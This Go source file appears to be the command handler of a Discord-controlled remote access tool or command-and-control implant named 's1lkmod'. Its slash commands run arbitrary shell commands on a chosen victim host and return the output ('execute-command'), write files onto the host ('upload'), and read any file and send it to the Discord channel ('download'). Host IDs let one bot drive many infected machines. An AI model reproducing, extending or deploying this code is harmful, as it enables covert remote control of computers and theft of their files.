package main

import (
	"fmt"
	"os"
	"s1lkmod/pkg/modules/cmd"
	"s1lkmod/pkg/modules/file"
	"s1lkmod/pkg/utils/response_handler"

	"github.com/bwmarrin/discordgo"
)

var CommandHandlers = map[string]func(session *discordgo.Session, interaction *discordgo.InteractionCreate){
	// Response when /basic-command is called
	"basic-command": func(session *discordgo.Session, interaction *discordgo.InteractionCreate) {
		msgFormat := "This is just a test"
		response_handler.Response(session, interaction, msgFormat)

	},
	// Response when /execute-command is called
	"execute-command": func(session *discordgo.Session, interaction *discordgo.InteractionCreate) {
		// Gets the list of options in the structure
		options := interaction.ApplicationCommandData().Options
		// Creates a array for the list of options
		optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption, len(options))
		for _, opt := range options {
			optionMap[opt.Name] = opt
		}
		msgFormat := ""
		if option, ok := optionMap["host_id"]; ok {
			// To avoid clashing with multiple instances of the bot
			if option.StringValue() == hostID {
				if option, ok := optionMap["command"]; ok {
					// Takes the value of the option as string and pass it into the function to execute
					msgFormat = fmt.Sprintf("```%s```", cmd.Arkor(option.StringValue()))
				}
			} else {
				msgFormat = "```Host ID doesn't exist```"
			}
		}
		// Sends the result to the channel
		response_handler.Response(session, interaction, msgFormat)
	},
	"upload": func(session *discordgo.Session, interaction *discordgo.InteractionCreate) {
		filename := ""
		fileToUpload := ""
		msgFormat := ""
		options := interaction.ApplicationCommandData().Options
		optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption, len(options))
		for _, opt := range options {
			optionMap[opt.Name] = opt
		}
		if option, ok := optionMap["host_id"]; ok {
			if option.StringValue() == hostID {
				if option, ok := optionMap["filename"]; ok {
					filename = option.StringValue()
				}
				if option, ok := optionMap["file_to_upload"]; ok {
					fileToUpload = option.StringValue()
				}
				msgFormat = fmt.Sprintf("```%s```", file.UploadFile(filename, fileToUpload))
			} else {
				msgFormat = "```Host ID doesn't exist```"
			}

		}
		// Sends the result to the channel
		response_handler.Response(session, interaction, msgFormat)

	},

	"download": func(session *discordgo.Session, interaction *discordgo.InteractionCreate) {
		filename := ""
		msgFormat := ""
		anErrorOccured := false
		options := interaction.ApplicationCommandData().Options
		optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption, len(options))
		for _, opt := range options {
			optionMap[opt.Name] = opt
		}
		if option, ok := optionMap["host_id"]; ok {
			if option.StringValue() == hostID {
				if option, ok := optionMap["filename"]; ok {
					filename = option.StringValue()
					file, err := os.Open(filename)
					if err != nil {
						anErrorOccured = true
						msgFormat = fmt.Sprintf("```Error - %s```", err)
					}
					response_handler.FileResponse(session, interaction, filename, file)
				}
			} else {
				anErrorOccured = true
				msgFormat = "```Host ID doesn't exist```"

			}

		}
		if anErrorOccured {
			response_handler.Response(session, interaction, msgFormat)
		}

	},
}
